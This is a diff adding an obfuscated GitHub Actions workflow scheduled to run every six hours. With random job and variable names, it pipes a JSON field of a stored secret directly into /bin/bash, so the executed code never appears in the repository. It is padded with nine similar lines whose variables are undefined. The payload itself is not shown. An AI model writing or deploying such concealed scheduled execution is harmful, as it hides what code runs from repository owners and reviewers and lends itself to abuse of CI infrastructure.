@@ -1,0 +1,26 @@
+name: qinwuhua6451
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qinwuhua6451
+        env:
+          hmsk5695: ${{ secrets.hmsk5695 }}
+        run: |
+          echo $hmsk5695 | jq -r .pf63 | /bin/bash
+          echo $jixy8 | jq -r .vos934 | /bin/bash
+          echo $q55 | jq -r .orr66853 | /bin/bash
+          echo $xwzl36 | jq -r .eypmw61254 | /bin/bash
+          echo $atprs4 | jq -r .df975 | /bin/bash
+          echo $cjlat2 | jq -r .ih643 | /bin/bash
+          echo $ybst79 | jq -r .revq7 | /bin/bash
+          echo $jfz76040 | jq -r .xv95 | /bin/bash
+          echo $bzmse18565 | jq -r .p26 | /bin/bash
+          echo $hqy75730 | jq -r .xrt406 | /bin/bash
+
